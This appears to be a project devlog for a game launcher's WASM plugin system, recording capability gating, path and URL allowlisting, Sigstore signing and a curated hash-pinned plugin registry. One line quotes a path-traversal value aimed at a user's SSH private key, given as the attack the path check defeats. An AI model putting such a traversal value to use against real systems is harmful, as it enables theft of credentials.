Interim, shipped this milestone: corrected `ConfirmInstallModal.vue`'s copy from implying real sandboxing to stating plainly that an installed plugin runs with the same access as any program on the system, and added the same caveat to the main README's plugin architecture section - so the UI/docs don't overclaim protection that doesn't exist yet.

**Permission gating for `spawn-process`/`run-and-wait`, implemented.** Picked over path allowlisting and URL allowlisting as the first of the three real mitigations, since it doesn't require solving path allowlisting's hard problem (Steam/GOG/Epic discover install locations at runtime via the registry, so they can't declare exact file paths in `plugin.json` ahead of time the way a capability tag can be declared) - checked which plugins actually call these two host functions first (`grep`, not assumed): Steam/GOG/Epic (launch) and LR/LE (installer + launch), all five. The three metadata providers never do.
- New `plugin_capability_grants` table (`plugin_id`, `capability`), added as a real new migration (v2) rather than amending the squashed v1 baseline again - `.claude/CLAUDE.md`'s schema rule ("new tables as a new migration, never edit a shipped migration in place") applies regardless of pre-1.0 status; the earlier squash was a one-time exception already spent, not an ongoing license. Deliberately its own table, not a `plugin:<id>:<key>` row in `settings` - a WASM guest's own `settings-get`/`settings-set` host functions can freely read/write any key under its own `plugin:<id>:` prefix, so a grant living in that same namespace would let a plugin just call `settings-set` on its own grant key and self-grant the very capability the table exists to gate. A guest has zero code path to `plugin_capability_grants` at all - only `has_capability` (host-side, `wasm_plugins.rs`) reads it, and only the frontend ever writes it
  - `PluginHostState::has_capability(capability)` queries the table directly using `self.plugin_id`/`self.db` (no guest-reachable path); `do_spawn_process`/`do_run_and_wait` both check it first and return an error string if ungranted, before doing anything else. Enforcement is host-side, not at the WASM Component Model import level - a component still imports the full `host` interface either way (WIT can't partially import one interface), the actual refusal happens inside the Rust function body
  - New Tauri commands `grant_plugin_capability`/`is_plugin_capability_granted` (`wasm_plugin_runtime.rs`) - simple one-off `rusqlite` queries against a fresh connection, no WASM instantiation needed for either
- `WasmPluginManifest`/`PluginPreview` (`plugin_installer.rs`) and the TS `PluginManifest`/`PluginPreview` (`manifest.ts`) gained `capabilities: string[]` (`#[serde(default)]`/optional) - an array, not a single bool, so a future second capability tag (e.g. one for the still-open path-allowlisting item) doesn't need another breaking manifest change. `RUN_PROGRAMS_CAPABILITY = "run-programs"` exported as the one constant value today
- Two UI surfaces, deliberately sharing the same underlying grant-write call rather than two different code paths: **new installs** (`ConfirmInstall.vue`) - if the fetched manifest declares `run-programs`, a checkbox appears ("This plugin runs other programs on your system... I understand and allow this"), Install stays disabled until checked, confirming writes the grant via `grant_plugin_capability` before the real install proceeds. **Already-installed plugins** (`PluginSettings.vue`, Source and Wrapper tabs) - any installed manifest declaring the capability without a recorded grant gets a "Permission needed" row with a Grant button. No silent grandfathering for plugins that predate this feature (Steam/GOG/Epic/LR/LE) - deliberately chosen over auto-granting them, since a silent grandfather clause would undercut the milestone's own "not silent" requirement; existing users click Grant once per plugin after upgrading, same one-time friction a brand-new install's checkbox already requires
- Declared `"capabilities": ["run-programs"]` in all five plugins that actually call these functions (confirmed via `grep`, not assumed) - `steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin` - each bumped `0.1.1` → `0.2.0` (minor: new capability declaration, backward compatible - an older Concourse build ignores the unknown manifest field and behaves exactly as before) and README'd with a `## Permissions` section. Steam and Epic's declarations are honestly noted as currently inert (their own READMEs already said `launch()` is dead code, since the host's own URI dispatch handles `steam://`/`com.epicgames.launcher://` directly) - declared anyway for forward-compatibility, since the WIT export exists and could become reachable later without a manifest change catching up to it then
- Main README's Milestone 12 security note updated from "planned but not implemented" to reflect the real, narrowed state: `spawn-process`/`run-and-wait` are gated now, file/registry/network access still isn't
- Follow-up, prompted by the user asking exactly which games actually launch through a WASM plugin's `spawn-process` (answer: only GOG and LR/LE for real - Steam/Epic launch via `openUrl()` on their own URIs, never touching the plugin's `launch()` at all, confirmed by reading `library.ts`'s actual dispatch): Steam's and Epic's `launch()` implementations weren't just unreachable, they were latently broken - both called `host::spawn-process(&entry.executable_path, ...)` where `executable_path` is literally the `steam://`/`com.epicgames.launcher://` URI string, which would fail immediately if ever invoked (a URI can't be spawned as a process, the exact "OS error 123" class of bug `launcher.rs` already had to work around for the host's own dispatch). Fixed both to return a documented error instead of calling `spawn-process` at all, and dropped their now-pointless `run-programs` capability declaration (`0.2.0` → `0.2.1`, patch) - they never legitimately call the gated function anymore, so there's nothing to grant
- Caught and fixed a real local dev-environment mistake while reinstalling these: an earlier `cp ... "$BASE/epic-wasm/"` step (during the original capability-declaration sync) collapsed into writing a flat file named `epic-wasm` directly under `wasm-plugins/source/` instead of a `epic-wasm/plugin.json` + `epic-wasm/<entry>.wasm` directory pair - same for `gog-wasm`. Both installed plugins were silently broken (no `.wasm` present at all) until caught by inspecting the actual directory listing rather than trusting the `cp` command's exit code; fixed by removing the flat files and recreating proper directories with both files copied in correctly
- **A second, more serious mistake**: reported by the user as "no themes show up" - the real symptom was much bigger (`Uncaught (in promise) migration 1 was previously applied but has been modified`), meaning the whole DB connection failed to initialize, taking every store's `init()` down with it (themes just happened to be the first thing the user checked). Root cause: when `db.rs`'s `migrations()` was restructured from a single `Migration` to a `vec![...]` of two, migration v1's `sql` raw-string literal got re-indented in the process (one extra nesting level) even though its actual SQL content never changed. `tauri-plugin-sql` hashes each migration's exact content against its own ledger of what already ran - a whitespace-only change is still "modified" as far as that hash is concerned, and it refuses to proceed past a mismatch entirely, which cascaded into `settings`/`games`/every plugin manifest never loading, not just data-theme ones. Exactly the failure mode `db.rs`'s own comment already warned about ("its `sql`/`version` must never change - editing one in place desyncs that ledger"), triggered by mechanical reformatting rather than an intentional schema edit. Fixed by restoring v1's `sql` string byte-for-byte from the commit before the restructuring (confirmed via `diff` against that commit, not just eyeballed), leaving v2 as the only actually-new content. No manual DB repair needed - the ledger check is a live comparison against the current `migrations()` list, not a persisted "broken" flag, so matching the code back up self-heals on next launch

**Path allowlisting for file/registry host primitives, implemented.** The hard part flagged when this milestone was first scoped - Steam/GOG/Epic discover install paths at runtime, so they can't declare exact paths in `plugin.json` the way a capability tag was declared for spawn-process - turned out to be much narrower once actually measured (`grep`, not assumed, across all three): GOG never calls `read-file`/`list-dir`/`path-exists` at all (registry-only - GOG Galaxy keeps everything as flat registry key/value pairs, one subkey per installed game, no VDF/JSON files to parse). Epic's scan directory (`%ProgramData%\Epic\EpicGamesLauncher\Data\Manifests`) is hardcoded, not runtime-discovered - the *game's* install folder is genuinely variable (user-changeable in Epic's own launcher), but that variable path is just a string field inside a manifest file, never itself passed to a host file-access function. Steam is the only plugin whose read paths are genuinely dynamic (install location and library folders vary by user, can span multiple drives).

This split the fix into three pieces of very different difficulty, discussed and confirmed with the user before implementing (rejected an "Alternative C" host-driven-discovery idea along the way - inverting control so the host does the file walking would mean reintroducing per-vendor parsing logic into the trusted host, exactly what Milestone 8's WASM migration moved *out*, and would break third-party extensibility since a future community plugin's vendor format wouldn't be known to the host ahead of time):
- `write-file`/`remove-dir` are now hard-confined to the plugin's own `plugin-dir()`, unconditionally, no manifest declaration or escape hatch - every current legitimate use (LR/LE only, confirmed via `grep`: every `write-file`/`remove-dir`/`read-file`/`path-exists` call in both derives from `host::plugin-dir()`) already lives there, so this closes the arbitrary-overwrite/delete risk with zero functional cost.
- Registry reads and Epic's static manifest directory share one mechanism: a new `pathScopes` array in `plugin.json` (`PathScope::Registry { hive, prefix }` / `PathScope::Path { prefix }`, `wasm_plugins.rs`), enforced host-side in `do_read_registry_string`/`do_list_registry_keys`/`do_read_file`/`do_list_dir`/`do_path_exists` via `is_allowed_registry`/`is_allowed_read_path`. Both check a lexically-normalized prefix match (`normalize_components`/`path_has_prefix` - resolves `.`/`..` without touching disk, so it works for paths that don't exist yet and can't be fooled by a `<scoped-dir>\..\..\Users\x\.ssh\id_rsa`-style traversal attempt) rather than `std::fs::canonicalize` (which needs the path to already exist and produces Windows' awkward `\\?\`-prefixed form). Steam declares its own fixed vendor registry keys (`Software\Valve\Steam`, `SOFTWARE\WOW6432Node\Valve\Steam`) plus its hardcoded fallback install path as a static `Path` scope too (`do_path_exists`'s pre-registry-check fallback needed it, would've silently started failing otherwise); GOG declares its four fixed vendor registry key prefixes (both bitness variants of `...\Games` and `...\GalaxyClient\paths`); Epic declares its one fixed manifests directory.
- Steam's genuinely dynamic library folders get a new host function, `request-read-scope(path)` (added to the shared `host` WIT interface, synced across all plugin repos - importing more functions than a guest actually uses is harmless for Component Model instantiation, so the other 7 plugins' already-compiled `.wasm` binaries didn't need rebuilding, just their `wit/plugin.wit` text kept in sync for future builds). Host-side (`do_request_read_scope`) only recognizes `"steam-wasm"` today, verified by checking for a real `steamapps` subdirectory under the requested path (Steam's own structural signature) before granting it for the rest of that instantiation (`dynamic_read_scopes`, in-memory only - fine since a fresh `PluginHostState` is created per Tauri command call anyway, and Steam's discovery-then-read all happens within one `scan()` call). Any plugin id without a registered validator is rejected outright with a clear error, not silently trusted and not given a real interactive user-approval prompt - discussed explicitly with the user and deferred, since no third-party plugin exists yet to actually exercise that fallback path; building speculative UI for zero current callers isn't worth it, noted here so it's a deliberate, revisitable choice, not a silent gap
- Steam's `find_steam_library_folders()` now calls `request-read-scope` on its resolved install path before reading `libraryfolders.vdf`, and again on every additional library folder path extracted from it before that folder's `steamapps` directory gets listed. Rebuilt all three (`steam-source-wasm-plugin`/`gog-source-wasm-plugin`/`epic-source-wasm-plugin`), bumped `0.2.x` → `0.3.0` (minor: new capability surface, backward compatible) - discovered along the way that Steam's and GOG's local `wit/plugin.wit` copies were badly stale (missing everything added since early Milestone 8 - `write-file`/`remove-dir`/`list-registry-keys`/`run-and-wait`/`http-request`/etc.), pre-existing drift unrelated to this change but fully re-synced while touching these two repos anyway, since a stale WIT file is a real documentation hazard for anyone rebuilding from source even though it never affected the already-compiled binaries
- No new frontend/UI work needed for this piece at all - unlike the `run-programs` capability gate, path scoping is fully host-enforced and silent-but-safe by design (a plugin either has a legitimate declared/verified scope or its call fails with a clear error), no install-time checkbox or Settings-panel grant button required

**URL allowlisting for `http-get`/`http-request`/`download-bytes`, implemented - Milestone 12 fully closed.** Measured real usage first (`grep`, same discipline as the path allowlisting piece) rather than assuming a general mechanism was needed: Steam/GOG/Epic make zero network calls at all, and every plugin that does (LR/LE, IGDB, SGDB, RAWG) only ever talks to a small, fixed set of hostnames known at author time. `download-bytes`'s target for LR/LE is a *dynamic string* (`asset.browser_download_url`, not a literal in source) but it's always a URL GitHub's own release API returned, never attacker-influenced input - so even the one "dynamic-looking" case reduces to a static host once you check where the string actually comes from. No plugin needed anything resembling Steam's verified-elevation mechanism from the previous item; a plain static allowlist covers 100% of real usage.
- New `plugin.json` field `httpScopes: string[]`, parsed into `PluginHostState.http_scopes`, checked by `is_allowed_host` (`wasm_plugins.rs`) before every `do_http_get`/`do_http_request`/`do_download_bytes` call. Parses the URL via `reqwest::Url` (already a transitive dependency, no new crate needed) and matches the host against each scope entry either exactly or as a subdomain suffix (`host.ends_with(".{scope}")`) - declaring `"github.com"` alone covers both `github.com` and `api.github.com` without listing every subdomain. Only the plugin-supplied entry URL is checked; whatever redirect chain the HTTP client follows internally afterward (e.g. GitHub's release-asset CDN) is out of scope, same as how this kind of check normally works everywhere else
- No WIT change needed this time (unlike `request-read-scope`) - `http-get`/`http-request`/`download-bytes`'s signatures are unchanged, only the host-side enforcement wrapping them changed, so no plugin repo needed a rebuild for the *mechanism* itself
- Declared `httpScopes` in the five plugins that actually make network calls, each bumped `0.2.0` → `0.3.0` (manifest-only change, no Rust source touched, so no rebuild needed for these five either - just the `plugin.json` itself): `locale-remulator-wasm-plugin`/`locale-emulator-wasm-plugin` → `["github.com"]`; `igdb-metadata-wasm-plugin` → `["id.twitch.tv", "api.igdb.com"]` (two unrelated domains, Twitch OAuth vs. IGDB's own API, declared separately since neither is a subdomain of the other); `sgdb-metadata-wasm-plugin` → `["steamgriddb.com"]`; `rawg-metadata-wasm-plugin` → `["api.rawg.io"]`. Steam/GOG/Epic get no `httpScopes` entry at all - correctly matches their real zero-network-calls behavior, no explicit empty array needed since `#[serde(default)]` already means "no scopes granted"
- Rejected the milestone wording's "rate-limiting" alternative outright once the real-usage data was in - it doesn't stop a plugin talking to an attacker's server, only slows down how often, which isn't the actual threat (exfiltration happening at all, not exfiltration happening *fast*). The allowlist is a real fix for the real risk; rate-limiting would have been security theater layered on top of an still-open hole

Milestone 12 is now fully closed - all four items (honest risk warning, path allowlisting, spawn-process/run-and-wait permission gating, URL allowlisting) done. Main README's security note updated to drop the "network access is unrestricted" caveat, replaced with the real remaining scope (nothing - every host-exposed capability that mattered is now gated, scoped, or requires an explicit grant).

**Follow-up, prompted by a genuinely important question**: "wouldn't this approach be dangerous in any circumstance?" Answered honestly rather than just restating what the mechanism does: `pathScopes`/`httpScopes` are entirely self-declared by the plugin's own `plugin.json` - unlike the `run-programs` capability grant (a real out-of-band step, the *user* has to click Grant), nothing stops a malicious plugin author from just declaring their own exfiltration server as an `httpScope` and having the check pass trivially. It only catches a plugin reaching *beyond* what it declared (scope creep, bugs, a compromised dependency), not a plugin that's malicious from the point of declaring its own manifest. That's a real, structural gap versus the capability-grant mechanism - and unlike that one, `pathScopes`/`httpScopes` were completely invisible to the user at install time, no equivalent of the `run-programs` checkbox existed for them at all.
- Fixed the visibility gap: `PluginPreview` (`plugin_installer.rs`) gained `path_scopes`/`http_scopes` fields (the `PathScope` enum gained `Serialize` alongside its existing `Deserialize` so it can round-trip to the frontend), populated in `fetch_plugin_preview` for source/metadata-kind previews (empty for themes, which have no scope concept). `ConfirmInstall.vue` now renders a "Declares access to:" list (registry keys, path prefixes, hostnames) alongside the existing risk-warning text and the `run-programs` checkbox - visibility only, explicitly not a new enforcement step (the host enforces `pathScopes`/`httpScopes` identically whether or not anyone reads this list). Rewrote the dialog's blanket "runs with the same file and network access as any program" copy too, since it was flatly wrong post-M12 (an undeclared-scope plugin now gets essentially nothing - no network at all, no files outside its own `plugin-dir()`) - replaced with an honest statement that access is scoped to what's declared below, but that declaration is self-reported by the plugin's own author, not verified against what the code actually does
- Doesn't change the underlying trust model at all - this is groundwork for a human (or, someday, tooling) to actually *look* at what a plugin claims before installing, not a new security boundary. Real authenticity verification (is this plugin's declared behavior actually what it does) is still Milestone 13's job, not this one's

## Milestone 13 — Plugin Trust Model: Signing & Review (stretch)
Follow-up question after scoping Milestone 12: does capability sandboxing alone answer "should I trust this plugin at all," and separately, does the WASM choice itself get undermined by any of this? Recap of Milestone 8's actual reasoning first, since that was worth re-checking before adding more scope on top of it - WASM was picked specifically to avoid native dylib loading (`libloading`), which would have meant unsandboxed, unbounded arbitrary code execution with no enumerable capability surface at all. Even with Milestone 12 still open, WASM already delivers on that: memory safety is real (a plugin can't corrupt host memory or make arbitrary syscalls), and the full set of things a plugin could possibly do is the finite, auditable list in `wit/plugin.wit` - a native dylib would have had none of that. Milestone 12's gap (those enumerated functions being currently unscoped) is a defense-in-depth layer on top of a still-sound original decision, not evidence the decision was wrong. Milestone 13 is a third, further layer again - it doesn't answer "what can a plugin technically do" (that's Milestone 12), it answers "should this specific plugin be trusted to run at all," which capability sandboxing can never answer on its own.

Prompted by a real, concrete question: GitHub computes and shows a SHA256 digest for every release asset - is that useful here? Worth being precise about what it actually proves. It's an **integrity** guarantee (the bytes weren't corrupted or tampered with in transit) - it is not an **authenticity** guarantee, because the hash is served by the same channel/account as the artifact itself. If a repo or account is compromised and a malicious release goes up, GitHub computes an equally legitimate-looking hash for that malicious file too - the hash and the artifact share a trust root, so it can't vouch for that root. That's exactly what real code signing (a private key held independently of the hosting channel, verified against a public key the client already trusts) is for, and a self-reported GitHub digest doesn't substitute for it.

That said, a cheap design does fall out of it: a separate whitelist repo/wiki, maintained by hand, listing `{plugin id, version, manifest URL, expected sha256}` - the app would check a downloaded plugin's actual hash against the *pinned* value in that separate registry, not against whatever hash the plugin's own release currently self-reports. This collapses two of the three Milestone 13 bullets into one lightweight, actually-buildable piece: it's a real curated registry (an entry only exists because someone reviewed and pinned it), and revocation comes for free (pulling or flagging a bad entry there *is* revocation - no separate mechanism needed). It does not give the signing bullet - the trust root becomes "whoever has write access to the whitelist repo" rather than a cryptographic identity, which is a legitimate, much simpler trust model appropriate for a personal-scale project, just not equivalent to real PKI-based code signing. Left Milestone 13's three bullets as-is rather than rewriting them around this - the whitelist repo is one possible future implementation of two of the three, not a redefinition of the milestone itself.

**Follow-up: the signing bullet isn't actually the heavy one either.** A second real, concrete question - "wasn't there a free option to get artifacts code-signed through GitHub Actions?" - turned up GitHub Artifact Attestations (`actions/attest-build-provenance`, GA since June 2024). Free for public repos (every plugin repo is public), it uses Sigstore's public-good instance: a short-lived signing certificate gets issued bound to the GitHub Actions OIDC token for that specific run (repo + workflow + commit), the artifact gets signed with it, and the signed attestation is written to Rekor - a public, append-only transparency log independent of the repo/account itself. This is the missing piece from the SHA256 discussion above: the trust root moves from "whoever controls the repo/hosting channel" to Sigstore's transparency log, so a compromised repo account can't retroactively forge a legitimate-looking attestation for a malicious release the way it can for a self-reported hash. Verification is a single command, `gh attestation verify <file> --repo <owner>/<repo>`.

Net effect on Milestone 13: the signing bullet goes from "distinct, heavier tier, unlikely to be worth building" to "one extra CI step (`actions/attest-build-provenance`) plus one verify call in the app's install flow (`fetch_wasm_plugin_manifest`/`install_wasm_plugin` in `wasm_plugin_installer.rs` would be the natural place)." Not wired in yet - documented in `milestones.md`'s Milestone 13 note as the concrete answer, held off on implementation per explicit instruction to update the note first and wire it in later.

**Signing, implemented.** Picked up directly after M12 closed. Before building anything, the user asked the exact right question first: "how can I tell if a repo author is malicious so he wrote malicious code inside wasm and signed it?" Worth being honest about the answer rather than glossing past it - signing proves **provenance/integrity** ("this artifact really is what that repo's CI produced from that commit, unmodified since"), not **trustworthiness**. A repo owner who writes malicious code from day one gets a perfectly valid attestation for it - their own CI genuinely built and signed exactly what they committed, Sigstore has no opinion on intent. What signing actually stops is a *different*, narrower class of attack: tampering after the fact (a compromised CDN, a stolen release token pushing an asset that never went through the real commit-and-build flow, a hijacked repo slipping in a rogue release). Answering "is this author trustworthy" is the milestone's *other* two bullets (curated registry, revocation), not this one - built anyway since it's real, narrower value, not a substitute for those.

- **Dependency research, the hard way.** First candidate, `sigstore-verification` (jdx), had exactly the convenience API wanted (`verify_github_attestation(path, owner, repo, ...)`) - but a direct GitHub API check (not just a scraped page, which claimed the same thing and could have been a hallucination) confirmed it was archived days earlier, mid-release (issue for v0.2.9 still open). Depending on an abandoned crate for cryptographic verification was rejected outright regardless of why it was archived - no future patches if Sigstore's bundle format or GitHub's API shape changes. Found the real answer instead: `sigstore/sigstore-rust` (official Sigstore org, pushed the day before this work, split into focused crates - `sigstore-verify`, `sigstore-trust-root`, `sigstore-bundle`, `sigstore-types`). Lower-level than the archived convenience wrapper (no GitHub-specific one-call function), so the actual GitHub-attestation flow had to be built out of primitives, but on a maintained, official foundation instead of an abandoned side project
- **Exact API confirmed by reading the real crate source** (`~/.cargo/registry/src/.../sigstore-verify-0.1.1/src/verify.rs`) rather than trusting scraped docs.rs summaries again, which had already been unreliable twice in this same research pass (one page hallucinated missing param types, another apparently missed the `bundle` field GitHub's own OpenAPI schema clearly has). `TrustedRoot::production()` turned out to be fully embedded (`include_str!` of a bundled `trusted_root.json`) - no live TUF fetch needed for the trust root at all, only the attestation bundle itself needs a real network call (to GitHub's own API, unavoidable). GitHub's authoritative OpenAPI spec (`github/rest-api-description`) confirmed the exact response shape (`attestations[].bundle`, matching `sigstore_types::Bundle`'s JSON shape directly - `mediaType`/`verificationMaterial`/flattened DSSE content)
- **A real, separate toolchain gap surfaced along the way**: `aws-lc-sys` (pulled in transitively for the crypto backend) needs NASM installed on Windows, and none of `scoop`/`choco`/`winget` actually got it working from this Bash-tool session - `winget install` reported success but the package never registered (likely tied to a known-broken Windows user profile on this machine), `choco` needed admin elevation this session didn't have. Worked around entirely by downloading NASM's own portable zip and prepending it to `PATH` for the build session - no system install needed at all. Separately, PowerShell resolves Windows-native tool paths more reliably than this session's Git-Bash/MSYS shell for anything spawning native `.exe`s (confirmed earlier in the SSH-signing saga too) - used PowerShell for every Rust build from this point on
- **New host module** `plugin_verification.rs` (not a separate crate/repo - discussed explicitly with the user first: this is core, always-trusted host infrastructure with exactly one caller and no reuse case, unlike WASM plugins' own separate-repo pattern, which exists specifically to prove the "install arbitrary third-party code" model holds). `parse_github_owner_repo(url)` extracts `{owner, repo}` from a `github.com` manifest URL; `verify_plugin_provenance(bytes, owner, repo)` computes the artifact's SHA256, fetches `GET /repos/{owner}/{repo}/attestations/sha256:{digest}`, parses out the bundle, and calls `sigstore_verify::verify_with_trusted_root` with a policy requiring `issuer = https://token.actions.githubusercontent.com` and `identity = https://github.com/{owner}/{repo}/.github/workflows/publish.yml@refs/heads/main` - hardcoded to match every one of this project's own plugin repos' actual `publish.yml` convention (workflow literally named `publish.yml`, triggered on push to `main`); a repo using a different filename/branch would need this updated, no generic way to discover that
- **Advisory, not enforced, deliberately** - `install_wasm_plugin` (`plugin_installer.rs`) attempts verification and returns the outcome (`InstallResult { id, verified, verification_note }`) but never blocks the install on failure. Hard-rejecting wasn't viable yet: not one single existing plugin release predates this feature, so every currently-published release would fail verification (no attestation exists for it) and every install-by-URL would break until each repo's CI ships a new signed release. `pluginInstall.ts` toasts the outcome after install completes rather than showing it in `ConfirmInstall.vue` up front like `pathScopes`/`httpScopes` were - verification needs the actual downloaded `.wasm` bytes to hash, which `fetch_plugin_preview` deliberately never downloads (stays a lightweight manifest-only fetch), so there's no point before install exists to check it at
- **A real regression from the *previous* milestone item caught along the way**: running the actual test suite (`cargo test`, not just `cargo check --tests` which only type-checks) for the first time since the M12 path-allowlisting work revealed the reference `exe-scanner-plugin` end-to-end test had been silently broken - its fixture manifest declared no `pathScopes`, so its legitimate scan of a directory outside its own `plugin-dir()` (a stand-in for a real "user-configured scan folder" pattern) now correctly got rejected. Fixed by having the test declare a `pathScopes` entry for its own temp scan directory, same as a real plugin author would - not a workaround, the test fixture was simply out of date with the enforcement it was supposed to be exercising. A good reminder that `cargo check` isn't a substitute for `cargo test` even when nothing was consciously being changed in that area
- CI: `actions/attest-build-provenance@v2` added to all 8 plugin repos' `publish.yml` (new `id-token: write`/`attestations: write` permissions, one step staged right after building, before the release gets published), each bumped `0.3.0` → `0.3.1` specifically to force a new release through (without a version bump, the "already published, skip" check would never let a new signed release actually get cut, since the workflow's own path filters don't include `.github/workflows/**`). Every plugin README gained a `## Signing` section with the `gh attestation verify` command and an honest note about what's actually being proven

**Curated registry + revocation, both closed in one piece - Milestone 13 fully done.** Picked up immediately after signing, same session. Scoped down first via `AskUserQuestion`: install-time hash-pin check only, no startup revocation re-check against already-installed plugins - kept for a later pass if it turns out to matter, rather than building speculative UI for a case that hasn't come up yet.
- New repo `concourse-plugin-registry` - a single `registry.json`, one entry per hand-reviewed plugin: `{id, name, kind, repo, manifestUrl, wasmSha256}`. `manifestUrl` always points at a specific tagged release (`releases/download/vX.Y.Z/...`), never `releases/latest/...` - pinning against "latest" would mean silently trusting whatever gets published next with zero review of it, defeating the entire point. Bumping which version is listed is a deliberate manual edit (re-download, re-review, re-hash, re-pin), not automatic. README states plainly what "reviewed" actually means right now (one person, `smh0505`, reading the pinned commit before adding it) rather than implying a moderation process that doesn't exist
- `wasmSha256` computed from the *actual published release asset*, not self-reported by the plugin's own CI and not the same value as the Sigstore attestation's own digest - downloaded and hashed all 8 real `v0.3.1` release artifacts for real (`sha256sum`) rather than trusting a locally-rebuilt copy, since a real pin has to match what a user would actually download
- `scripts/validate.sh` + a CI workflow re-derives every entry's hash from its live `manifestUrl` on every push/PR and fails if it doesn't match `wasmSha256` - catches a copy-paste mistake in the registry itself before it ships, not just plugin-side bugs. Verified locally with an equivalent Python script first (no `jq` in this dev environment) before writing the real bash+jq version that actually runs in CI - all 8 entries checked out clean on the first real run
- New host module `plugin_registry.rs` (`fetch_plugin_registry` command, plain GET against the registry's raw `main` branch file - same trust model as fetching any other manifest URL already). `plugin_installer.rs`'s `install_plugin`/`install_wasm_plugin` gained an `expected_sha256: Option<String>` parameter - when present (only ever passed for a registry-sourced install, never a freeform-pasted URL), a mismatch is a **hard reject**, unlike the Sigstore check's advisory-only failure. The asymmetry is deliberate and stated in both the code and the registry's own README: an attestation mismatch just means "no attestation exists yet" (true for every pre-Milestone-14 release), but a pinned-hash mismatch means "this doesn't match what was actually reviewed" - a real, actionable signal, not a rollout-timing artifact
- Frontend: `pluginInstall.ts` gained `registryEntries`/`loadRegistry()`, and `previewInstall`/`confirmInstall` now thread an optional `expectedSha256` through end to end. `AddPlugin.vue` fetches the registry on mount and shows it as a second path alongside the existing freeform-URL field - clicking a registry entry's own Install button goes through the identical preview/confirm flow as a pasted URL, just with the pinned hash attached. A registry fetch failure (network down, repo unreachable) is silently swallowed rather than toasted - freeform install-by-URL was never gated by the registry's availability and shouldn't start erroring just because an *additional*, more-trusted path happened to be unreachable

**Version-bump automation, added after the milestone closed.** The manual "re-download,
re-review, re-hash, re-pin" busywork described above still had to happen by hand for every real
plugin release. User asked to automate the *mechanical* part of that (fetching + hashing +
committing) while explicitly keeping the human review/merge gate - not a request to trust
"latest" automatically, which would have quietly undone the entire point of a curated registry.
- Each of the 8 plugin repos' `publish.yml` now fires a `repository_dispatch` (`event_type:
  plugin-release`, payload `{repo, tag}`) to `concourse-plugin-registry` right after publishing
  a release. A new `scripts/bump-entry.sh` there re-downloads that exact release's manifest and
  `.wasm`, independently computes the real sha256 (never trusts a value the dispatch payload
  itself could have carried), and patches just that one entry's `manifestUrl`/`wasmSha256`. A
  new workflow, `bump-from-release.yml`, wraps that script and opens a PR rather than committing
  to `main` directly - the existing `validate.yml` (unchanged) re-verifies the hash independently
  on the PR and again on merge, so a bot-authored change gets the identical scrutiny a
  human-authored one would. Nothing is trusted-and-merged automatically; a human still has to
  read the diff and click merge
- Real end-to-end test (not just a code review) surfaced two actual bugs, both fixed before
  calling this done:
  1. The first cut wired the dispatch into a *separate* workflow triggered by `release:
     published`, matching the pattern the plugin repos already used for other automation. It
     never fired. Root cause: `publish.yml` creates its release via `softprops/action-gh-release`
     using the default `GITHUB_TOKEN`, and GitHub's loop-prevention rule means events created by
     that token don't trigger *other* workflows in the same repo - confirmed by cutting a real
     `v0.3.2` test release on `rawg-metadata-wasm-plugin` and watching the separate
     `notify-registry.yml` never run. Fix: call the dispatch as an inline step at the end of
     `publish.yml`'s own job instead (same `steps.check.outputs.exists == 'false'` guard), so it
     rides the same job/token context that just did the actual publishing rather than depending
     on a second event firing at all. Propagated to all 8 repos; the dead separate-workflow file
     removed everywhere
  2. Once the dispatch did fire, `bump-from-release.yml`'s PR step failed outright -
     `concourse-plugin-registry` didn't have "Allow GitHub Actions to create pull requests"
     enabled (off by default on a new repo). Enabled via
     `gh api -X PUT .../actions/permissions/workflow -f default_workflow_permissions=write -F
     can_approve_pull_request_reviews=true`. Retrying the same dispatch then hit a second,
     related issue - the bump branch already existed from the first failed attempt, so the plain
     `git push` was rejected as a non-fast-forward. Fixed by force-pushing the bump branch (it's
     disposable and bot-owned, always rebuilt fresh from `main`, so a leftover branch from a
     retried run should just be replaced) and skipping `gh pr create` if a PR is already open for
     that branch, so a retried dispatch is idempotent instead of erroring
- One more one-off observed and left as-is rather than engineered around: the first PR's
  `validate.yml` run came back `action_required` and needed a single manual approval
  (`gh api -X POST .../actions/runs/<id>/approve`) before it would run at all - read as a
  first-time-bot-contributor gate on a brand-new repo, not a recurring requirement. Confirmed by
  observation: the post-merge `validate.yml` run on `main` and the dispatch used for the actual
  test both went straight to `success` with no gate the second time
- Test releases used real infrastructure end to end rather than synthetic data - genuine `v0.3.2`
  then `v0.3.3` patch bumps (no functional change) on `rawg-metadata-wasm-plugin`, a real signed
  release, a real registry PR, merged for real once verified (`registry.json` now legitimately
  points at `v0.3.3`, not left pinned to stale test data)

## 1.0.0 — Core Roadmap Closed, Post-1.0 Roadmap Opened
User call: bump `0.10.0` -> `1.0.0` now rather than waiting on the two leftover items (Milestone
7's ROM scanner sub-item - moved to its own milestone at the time, since renumbered again and
iceboxed unnumbered entirely; and the core roadmap's Xbox/EA/Ubisoft stretch goal - since moved
and renumbered to the milestone now numbered 15, entirely unstarted at the time). Judgment:
Milestones 1–6 and 8–11, plus both security milestones (now Milestones 12, 13, the most recently
closed and
arguably the highest-stakes work in the whole roadmap), are done; the two remaining items are
an unstarted stretch goal and one sub-item of an otherwise-closed polish milestone, neither
blocking real-world use the way the original "post-M12" versioning note implied when it was
written (back when that stretch goal's original core-roadmap slot was still the *next*
milestone in sequence under the numbering used at the time, not a skipped-over stretch goal
that later milestones passed by).
- Bumped `package.json`, `src-tauri/Cargo.toml`, `src-tauri/tauri.conf.json` to `1.0.0` together;
  `cargo check` regenerated `Cargo.lock`'s matching `concourse` package entry rather than hand-editing it
- `milestones.md` restructured rather than just bumping the header: Milestone 7's unstarted ROM
  scanner sub-item and the whole Xbox/EA/Ubisoft stretch goal moved out into a new
  `Post-1.0 Roadmap` section (renumbered Milestone 15/16 there), leaving both source milestones
  fully checked. Chose to
  keep calling them "Milestones" (not "Phases," despite that being the term floated) - it's the
  same document, same devlog cross-reference convention, just a second wave numbered
  continuously from 14, not a different kind of unit
- `CLAUDE.md`'s versioning rule rewritten to match: the "stay 0.x until post-M12" language no
  longer made sense once M12 was consciously deferred rather than completed-then-followed;
  replaced with "1.0.0 marks the core roadmap done, Post-1.0 minor bumps track closing a
  Post-1.0 Roadmap milestone"

## Milestone 16 (legacy) — External Theme Plugins: Component-Override Tier (re-reviewed, still blocked)
**Superseded** - milestones.md's Milestone 16 now tracks a different, narrower mechanism (a
constrained template tier), scoped from the Brick Block measurement below. Kept here as the
